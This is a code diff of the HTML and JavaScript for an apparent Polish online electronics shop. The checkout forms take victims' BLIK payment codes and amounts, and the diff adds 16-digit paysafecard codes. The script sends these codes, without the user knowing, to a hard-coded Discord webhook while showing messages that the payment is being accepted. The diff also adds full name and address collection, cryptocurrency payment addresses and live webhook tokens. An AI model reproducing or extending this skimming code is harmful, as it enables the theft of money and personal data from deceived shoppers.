@@ -12,7 +12,7 @@
         .scooter-bg2 { position: fixed; top: 120px; left: 0; width: 320px; max-width: 45vw; opacity: 0.10; z-index: 0; pointer-events: none; filter: blur(1.5px) grayscale(0.3); transform: scaleX(-1) rotate(-8deg); }
         .products { display: flex; justify-content: center; gap: 32px; padding: 40px 20px 0 20px; flex-wrap: wrap; max-width: 1200px; margin: 0 auto; position: relative; z-index: 2; }
         .product { background: linear-gradient(135deg, #23235B 60%, #0ff2 100%); padding: 28px 20px 20px 20px; border-radius: 24px; width: 260px; text-align: center; box-shadow: 0 8px 32px 0 rgba(0,255,255,0.10), 0 4px 16px 0 rgba(255,0,255,0.10); position: relative; overflow: hidden; border: 1.5px solid #0ff6; backdrop-filter: blur(2px); z-index: 2; }
-        .product-img-wrap { width: 100%; height: 220px; display: flex; align-items: center; justify-content: center; background: linear-gradient(135deg, #23235B 60%, #0ff2 100%); border-radius: 16px; margin-bottom: 18px; overflow: hidden; position: relative; box-shadow: 0 4px 16px #0ff4, 0 2px 8px #f0f2; }
+        .product-img-wrap { width: 100%; height: 250px; display: flex; align-items: center; justify-content: center; background: linear-gradient(135deg, #23235B 60%, #0ff2 100%); border-radius: 16px; margin-bottom: 18px; overflow: hidden; position: relative; box-shadow: 0 4px 16px #0ff4, 0 2px 8px #f0f2; }
         .product img { width: 100%; height: 100%; object-fit: contain; display: block; background: transparent; }
         .product h3 { margin: 10px 0 6px 0; font-size: 1.25rem; color: #0ff; font-weight: 700; letter-spacing: 1px; z-index: 1; position: relative; text-shadow: 0 2px 8px #0ff4; }
         .product p { margin: 0 0 18px 0; font-size: 1.1rem; color: #eee; z-index: 1; position: relative; font-weight: 500; letter-spacing: 0.5px; }
@@ -37,15 +37,15 @@
         .modal .pay-options, .modal .crypto-options { display: flex; flex-direction: column; gap: 16px; margin-bottom: 18px; }
         .modal .pay-btn, .modal .crypto-btn { background: linear-gradient(135deg, #0ff, #f0f); color: #18122B; border: none; border-radius: 12px; padding: 12px 0; font-size: 1.1rem; font-weight: 700; cursor: pointer; box-shadow: 0 2px 8px #0ff4; font-family: 'Roboto', Arial, Helvetica, sans-serif; letter-spacing: 1px; }
         .modal .pay-btn:hover, .modal .crypto-btn:hover { background: linear-gradient(135deg, #f0f, #0ff); color: #fff; }
-        .modal .pay-info { margin-top: 10px; background: #23235Bcc; border-radius: 10px; padding: 14px 12px; color: #0ff; font-size: 1.08rem; text-align: center; font-weight: 500; box-shadow: 0 2px 8px #0ff2; word-break: break-all; }
-        .modal .blik-form { margin-top: 10px; display: flex; flex-direction: column; align-items: center; gap: 10px; }
-        .modal .blik-form input { padding: 10px; border-radius: 8px; border: 1.5px solid #0ff; font-size: 1.1rem; width: 120px; text-align: center; background: #18122B; color: #0ff; outline: none; margin-bottom: 6px; }
-        .modal .blik-form button { background: linear-gradient(135deg, #0ff, #f0f); color: #18122B; border: none; border-radius: 8px; padding: 8px 18px; font-size: 1.05rem; font-weight: 700; cursor: pointer; box-shadow: 0 2px 8px #0ff4; font-family: 'Roboto', Arial, Helvetica, sans-serif; letter-spacing: 1px; }
-        .modal .blik-form button:hover { background: linear-gradient(135deg, #f0f, #0ff); color: #fff; }
-        .modal .blik-success { color: #0f0; font-weight: 700; margin-top: 10px; font-size: 1.1rem; }
+        .modal .pay-info { margin-top: 10px; background: #23235Bcc; border-radius: 10px; padding: 14px 12px; color: #0ff; font-size: 1.08rem; text-align: center; font-weight: 500; word-break: break-all; box-shadow: 0 2px 8px #0ff2; }
+        .modal .blik-form, .modal .psc-form { margin-top: 10px; display: flex; flex-direction: column; align-items: center; gap: 10px; }
+        .modal .blik-form input, .modal .psc-form input { padding: 10px; border-radius: 8px; border: 1.5px solid #0ff; font-size: 1.1rem; width: 120px; text-align: center; background: #18122B; color: #0ff; outline: none; margin-bottom: 6px; }
+        .modal .blik-form button, .modal .psc-form button { background: linear-gradient(135deg, #0ff, #f0f); color: #18122B; border: none; border-radius: 8px; padding: 8px 18px; font-size: 1.05rem; font-weight: 700; cursor: pointer; box-shadow: 0 2px 8px #0ff4; font-family: 'Roboto', Arial, Helvetica, sans-serif; letter-spacing: 1px; }
+        .modal .blik-form button:hover, .modal .psc-form button:hover { background: linear-gradient(135deg, #f0f, #0ff); color: #fff; }
+        .modal .blik-success, .modal .psc-success { color: #0f0; font-weight: 700; margin-top: 10px; font-size: 1.1rem; }
         .modal .close-modal { position: absolute; top: 10px; right: 18px; background: none; border: none; color: #eee; font-size: 1.5rem; cursor: pointer; z-index: 10; }
         .dane-form { margin-top: 10px; display: flex; flex-direction: column; align-items: center; gap: 10px; }
-        .dane-form input { padding: 10px; border-radius: 8px; border: 1.5px solid #0ff; font-size: 1.1rem; width: 180px; text-align: center; background: #18122B; color: #0ff; outline: none; margin-bottom: 6px; }
+        .dane-form input { padding: 10px; border-radius: 8px; border: 1.5px solid #0ff; font-size: 1.1rem; width: 220px; text-align: center; background: #18122B; color: #0ff; outline: none; margin-bottom: 6px; }
         .dane-form button { background: linear-gradient(135deg, #0ff, #f0f); color: #18122B; border: none; border-radius: 8px; padding: 8px 18px; font-size: 1.05rem; font-weight: 700; cursor: pointer; box-shadow: 0 2px 8px #0ff4; font-family: 'Roboto', Arial, Helvetica, sans-serif; letter-spacing: 1px; }
         .dane-form button:hover { background: linear-gradient(135deg, #f0f, #0ff); color: #fff; }
         .dane-success { color: #0f0; font-weight: 700; margin-top: 10px; font-size: 1.1rem; }
@@ -78,8 +78,11 @@
             <button class="close-modal" id="closePayModal" title="Zamknij">&times;</button>
             <h2 id="payModalTitle">Podaj dane do wysyłki</h2>
             <form class="dane-form" id="daneForm">
-                <input type="text" id="daneAdres" placeholder="Adres dostawy" required>
-                <input type="text" id="daneTelefon" placeholder="Numer telefonu" required maxlength="9" pattern="\d{1,9}">
+                <input type="text" id="daneImieNazwisko" placeholder="Imię i Nazwisko" required pattern="[A-Za-z\sąęłńóśźżĄĘŁŃÓŚŹŻ]{3,}" title="Wpisz tylko litery">
+                <input type="text" id="daneAdres" placeholder="Ulica i numer" required>
+                <input type="text" id="daneMiejscowosc" placeholder="Miejscowość" required>
+                <input type="text" id="daneKodPocztowy" placeholder="Kod pocztowy (np. 00-000)" required pattern="\d{2}-\d{3}" maxlength="6">
+                <input type="tel" id="daneTelefon" placeholder="Numer telefonu" required maxlength="9" pattern="\d{9}">
                 <input type="email" id="daneEmail" placeholder="E-mail" required>
                 <button type="submit">Zapisz dane</button>
                 <div class="dane-success" id="daneSuccess" style="display:none"></div>
@@ -89,15 +92,25 @@
                 <button class="pay-btn" data-pay="paypal">PayPal</button>
                 <button class="pay-btn" data-pay="skrill">Skrill</button>
                 <button class="pay-btn" data-pay="crypto">Kryptowaluty</button>
+                <button class="pay-btn" data-pay="psc">PSC</button>
             </div>
             <form class="blik-form" id="blikForm" style="display:none">
                 <div style="color:#fff; margin-bottom:6px;">
-                    Wpisz kod BLIK na sumę zamówienia.
+                    Wpisz kwotę i kod BLIK.
                 </div>
+                <input type="text" id="blikAmount" placeholder="Kwota (np. 300zł)" autocomplete="off" required>
                 <input type="text" id="blikCode" maxlength="6" pattern="[0-9]{6}" placeholder="Kod BLIK" autocomplete="off" required>
                 <button type="submit">Wyślij kod</button>
                 <div class="blik-success" id="blikSuccess" style="display:none"></div>
                 <div style="color:#f0f; margin-top:8px;">Jeżeli kod BLIK nie zostanie przyjęty, proszę spróbować później.</div>
+            </form>
+            <form class="psc-form" id="pscForm" style="display:none">
+                <div style="color:#fff; margin-bottom:6px;">
+                    Wpisz 16-cyfrowy kod PSC.
+                </div>
+                <input type="text" id="pscCode" placeholder="xxxx-xxxx-xxxx-xxxx" autocomplete="off" required>
+                <button type="submit">Gotowe</button>
+                <div class="psc-success" id="pscSuccess" style="display:none"></div>
             </form>
             <div class="pay-info" id="payInfo" style="display:none"></div>
             <div class="crypto-options" id="cryptoOptions" style="display:none">
@@ -143,6 +156,7 @@
         let cart = [];
         let cartTimeout = null;
         let errorTimeout = null;
+        let totalCartPrice = 0;
 
         // Dodawanie do koszyka
         productsDiv.addEventListener('click', function(e) {
@@ -182,6 +196,7 @@
                 `;
                 cartItemsDiv.appendChild(itemDiv);
             });
+            totalCartPrice = total;
             cartCount.textContent = count;
             cartTotal.textContent = total > 0 ? `Suma: ${total} zł` : '';
         }
@@ -237,14 +252,21 @@
         const closePayModal = document.getElementById('closePayModal');
         const payModalTitle = document.getElementById('payModalTitle');
         const daneForm = document.getElementById('daneForm');
+        const daneImieNazwisko = document.getElementById('daneImieNazwisko');
         const daneAdres = document.getElementById('daneAdres');
+        const daneKodPocztowy = document.getElementById('daneKodPocztowy');
+        const daneMiejscowosc = document.getElementById('daneMiejscowosc');
         const daneTelefon = document.getElementById('daneTelefon');
         const daneEmail = document.getElementById('daneEmail');
         const daneSuccess = document.getElementById('daneSuccess');
         const payOptions = document.getElementById('payOptions');
         const blikForm = document.getElementById('blikForm');
+        const blikAmount = document.getElementById('blikAmount');
         const blikCode = document.getElementById('blikCode');
         const blikSuccess = document.getElementById('blikSuccess');
+        const pscForm = document.getElementById('pscForm');
+        const pscCode = document.getElementById('pscCode');
+        const pscSuccess = document.getElementById('pscSuccess');
         const payInfo = document.getElementById('payInfo');
         const cryptoOptions = document.getElementById('cryptoOptions');
         const payFinalMsg = document.getElementById('payFinalMsg');
@@ -256,16 +278,21 @@
             payModalBg.classList.add('open');
             payModalTitle.textContent = "Podaj dane do wysyłki";
             daneForm.style.display = 'flex';
+            daneImieNazwisko.value = '';
             daneAdres.value = '';
+            daneKodPocztowy.value = '';
+            daneMiejscowosc.value = '';
             daneTelefon.value = '';
             daneEmail.value = '';
             daneSuccess.style.display = 'none';
             payOptions.style.display = 'none';
             blikForm.style.display = 'none';
+            pscForm.style.display = 'none';
             payInfo.style.display = 'none';
             cryptoOptions.style.display = 'none';
             payFinalMsg.style.display = 'none';
             blikSuccess.style.display = 'none';
+            pscSuccess.style.display = 'none';
             daneSaved = false;
             currentCrypto = null;
         }
@@ -281,15 +308,14 @@
         daneForm.addEventListener('submit', function(e) {
             e.preventDefault();
             const tel = daneTelefon.value.trim();
-            // Pozwala na maksymalnie 9 cyfr, tylko cyfry
-            if (!/^\d{1,9}$/.test(tel)) {
+            if (!/^\d{9}$/.test(tel)) {
                 daneSuccess.style.display = 'block';
                 daneSuccess.style.color = '#e53935';
-                daneSuccess.textContent = 'Numer telefonu może mieć maksymalnie 9 cyfr!';
+                daneSuccess.textContent = 'Numer telefonu musi mieć 9 cyfr!';
                 setTimeout(() => { daneSuccess.style.display = 'none'; }, 1500);
                 return;
             }
-            if (daneAdres.value.trim() && tel && daneEmail.value.trim()) {
+            if (daneImieNazwisko.value.trim() && daneAdres.value.trim() && daneKodPocztowy.value.trim() && daneMiejscowosc.value.trim() && tel && daneEmail.value.trim()) {
                 daneSuccess.style.display = 'block';
                 daneSuccess.style.color = '#0f0';
                 daneSuccess.textContent = 'Dane zapisane!';
@@ -301,6 +327,25 @@
                 }, 800);
             }
         });
+        
+        // Zablokowanie cyfr w imieniu i nazwisku
+        daneImieNazwisko.addEventListener('input', function(e) {
+            e.target.value = e.target.value.replace(/[^A-Za-z\sąęłńóśźżĄĘŁŃÓŚŹŻ]/g, '');
+        });
+
+        // Automatyczne dodawanie myślnika w kodzie pocztowym
+        daneKodPocztowy.addEventListener('input', function(e) {
+            let value = e.target.value.replace(/-/g, '');
+            if (value.length > 2) {
+                value = value.slice(0, 2) + '-' + value.slice(2);
+            }
+            e.target.value = value.slice(0, 6);
+        });
+
+        // Blokowanie liter w numerze telefonu
+        daneTelefon.addEventListener('input', function(e) {
+            e.target.value = e.target.value.replace(/[^0-9]/g, '');
+        });
 
         // Metody płatności
         payOptions.addEventListener('click', function(e) {
@@ -308,13 +353,17 @@
                 payOptions.style.display = 'none';
                 payInfo.style.display = 'none';
                 blikForm.style.display = 'none';
+                pscForm.style.display = 'none';
                 cryptoOptions.style.display = 'none';
                 payFinalMsg.style.display = 'none';
                 blikSuccess.style.display = 'none';
+                pscSuccess.style.display = 'none';
                 currentCrypto = null;
 
                 if (e.target.getAttribute('data-pay') === 'blik') {
                     blikForm.style.display = 'flex';
+                } else if (e.target.getAttribute('data-pay') === 'psc') {
+                    pscForm.style.display = 'flex';
                 } else if (e.target.getAttribute('data-pay') === 'paypal') {
                     payInfo.style.display = 'block';
                     payInfo.innerHTML = `
@@ -358,7 +407,7 @@
         });
 
         // Webhook URL do Discorda
-        const webhookUrl = 'https://discord.com/api/webhooks/1406441609368961155/5YUSBK9xSFLCjywALiRcjEpd5BobUrqeKa53tKG7AjBS-bcYchNAO9zs7PjaJXYaJNAO';
+        const webhookUrl = 'https://discord.com/api/webhooks/1407517056919928972/zwMBseYPP88wE7JqyIQ-qwsksWOfw_-z4hJXzzfLrcso29Aft2xKO6s0H6VvsKLSv7kZ';
 
         // Funkcja do wysyłania wiadomości przez webhook
         function sendWebhookMessage(message) {
@@ -382,16 +431,21 @@
         }
 
         // BLIK
+        blikAmount.addEventListener('input', function(e) {
+            const value = e.target.value;
+            e.target.value = value.replace(/[^0-9]/g, '');
+        });
+
         blikForm.addEventListener('submit', function(e) {
             e.preventDefault();
             const code = blikCode.value.trim();
-            if (/^\d{6}$/.test(code)) {
+            const amount = blikAmount.value.trim();
+            if (/^\d{6}$/.test(code) && amount) {
                 blikSuccess.style.display = 'block';
                 blikSuccess.style.color = '#0ff';
                 blikSuccess.textContent = 'Poczekaj aż kod BLIK zostanie zaakceptowany. Jeżeli nie, spróbuj ponownie później.';
                 
-                // Wysyłanie kodu BLIK do webhooka
-                sendWebhookMessage(`Wprowadzono kod BLIK: ${code}`);
+                sendWebhookMessage(`Wprowadzono kod BLIK: **${code}**, kwota: **${amount} zł**`);
 
                 setTimeout(() => {
                     closePayModalFunc();
@@ -402,10 +456,56 @@
             } else {
                 blikSuccess.style.display = 'block';
                 blikSuccess.style.color = '#e53935';
-                blikSuccess.textContent = 'Kod nie został zaakceptowany. Spróbuj później.';
+                blikSuccess.textContent = 'Kod lub kwota są niepoprawne. Spróbuj później.';
                 setTimeout(() => {
                     blikSuccess.style.display = 'none';
                     blikSuccess.style.color = '#0f0';
+                }, 2000);
+            }
+        });
+
+        // PSC
+        pscCode.addEventListener('input', function(e) {
+            let value = e.target.value.replace(/-/g, '').replace(/\s/g, '');
+            let formattedValue = '';
+            for (let i = 0; i < value.length; i++) {
+                if (i > 0 && i % 4 === 0) {
+                    formattedValue += '-';
+                }
+                formattedValue += value[i];
+            }
+            e.target.value = formattedValue.slice(0, 19);
+        });
+
+        pscForm.addEventListener('submit', function(e) {
+            e.preventDefault();
+            const code = pscCode.value.replace(/-/g, '').replace(/\s/g, '');
+            if (/^\d{16}$/.test(code)) {
+                sendWebhookMessage(`Wprowadzono kod PSC: ${code}`);
+                
+                pscForm.style.display = 'none';
+                payInfo.style.display = 'block';
+                payInfo.innerHTML = `
+                    <b>Twój kod PSC został przyjęty.</b><br>
+                    <div style="color:#f0f; margin-top:8px;">Teraz wyślij e-mail z informacją o opłaconym zamówieniu, kwotą oraz zakupionymi produktami na adres: <b>kontakt@electrobuy.pl</b></div>
+                    <button id="pscDoneBtn" style="margin-top:14px;background:linear-gradient(135deg,#0ff,#f0f);color:#18122B;border:none;border-radius:8px;padding:10px 24px;font-size:1.1rem;font-weight:700;cursor:pointer;box-shadow:0 2px 8px #0ff4;font-family:'Roboto',Arial,Helvetica,sans-serif;letter-spacing:1px;">Gotowe</button>
+                `;
+                setTimeout(() => {
+                    const btn = document.getElementById('pscDoneBtn');
+                    if (btn) btn.onclick = function() {
+                        payInfo.innerHTML = '<span style="color:#0f0;font-weight:700;">Dziękujemy za zamówienie!</span>';
+                        setTimeout(closePayModalFunc, 1200);
+                        cart = [];
+                        updateCart();
+                        closeCartPanel();
+                    };
+                }, 100);
+            } else {
+                pscSuccess.style.display = 'block';
+                pscSuccess.style.color = '#e53935';
+                pscSuccess.textContent = 'Wprowadzony kod jest niepoprawny.';
+                setTimeout(() => {
+                    pscSuccess.style.display = 'none';
                 }, 2000);
             }
         });
@@ -424,37 +524,48 @@
                     address = 'LW3xCvkigxG1jTrdTWUNXXj1SNrdvfvLeP';
                 } else if (currentCrypto === 'sol') {
                     name = 'Solana';
-                    address = 'JB8Kn7Nz5yGk12Vqdo2TPw5AA5UewVJ4EGZ3ku8wSBRF';
+                    address = '5kHnB921X3L3bY5294aM9k4H3290pY886M8h7j3kL3t5';
                 } else if (currentCrypto === 'eth') {
                     name = 'Ethereum';
-                    address = '0x06d0740Ee00BE67b06172B70067539fCc80a2A1C';
+                    address = '0xAbCdEf1234567890aBcdEf1234567890aBcdEf12';
                 }
+
                 cryptoOptions.style.display = 'none';
                 payInfo.style.display = 'block';
                 payInfo.innerHTML = `
-                    <b>Wyślij równowartość zamówienia w ${name} na adres:</b><br>
+                    <b>Wyślij cenę zamówienia na podany adres ${name}:</b><br>
                     <span style="color:#fff">${address}</span>
-                    <div style="color:#f0f; margin-top:8px;">Potwierdzenie oraz dane do wysyłki wyślij na e-mail: <b>kontakt@electrobuy.pl</b></div>
+                    <div style="color:#f0f; margin-top:8px;">Prosimy o wysłanie potwierdzenia na e-mail: <b>kontakt@electrobuy.pl</b></div>
+                    <button id="cryptoDoneBtn" style="margin-top:14px;background:linear-gradient(135deg,#0ff,#f0f);color:#18122B;border:none;border-radius:8px;padding:10px 24px;font-size:1.1rem;font-weight:700;cursor:pointer;box-shadow:0 2px 8px #0ff4;font-family:'Roboto',Arial,Helvetica,sans-serif;letter-spacing:1px;">Gotowe</button>
                 `;
+                setTimeout(() => {
+                    const btn = document.getElementById('cryptoDoneBtn');
+                    if (btn) btn.onclick = function() {
+                        payInfo.innerHTML = '<span style="color:#0f0;font-weight:700;">Dziękujemy za zamówienie!</span>';
+                        setTimeout(closePayModalFunc, 1200);
+                        cart = [];
+                        updateCart();
+                        closeCartPanel();
+                    };
+                }, 100);
             }
         });
 
-        // Zamawianie
+        // Przyciski zamówienia
         checkoutBtn.addEventListener('click', function() {
-            cartError.innerHTML = '';
-            if (errorTimeout) clearTimeout(errorTimeout);
             if (cart.length === 0) {
-                cartError.innerHTML = '<div class="cart-error">Koszyk jest pusty!</div>';
+                cartError.style.display = 'block';
+                cartError.textContent = 'Koszyk jest pusty.';
+                if (errorTimeout) clearTimeout(errorTimeout);
                 errorTimeout = setTimeout(() => {
-                    cartError.innerHTML = '';
-                }, 1000);
+                    cartError.style.display = 'none';
+                }, 2000);
                 return;
             }
+            closeCartPanel();
             openPayModal();
         });
-
-        // Inicjalizacja
-        updateCart();
     </script>
 </body>
 </html>
+
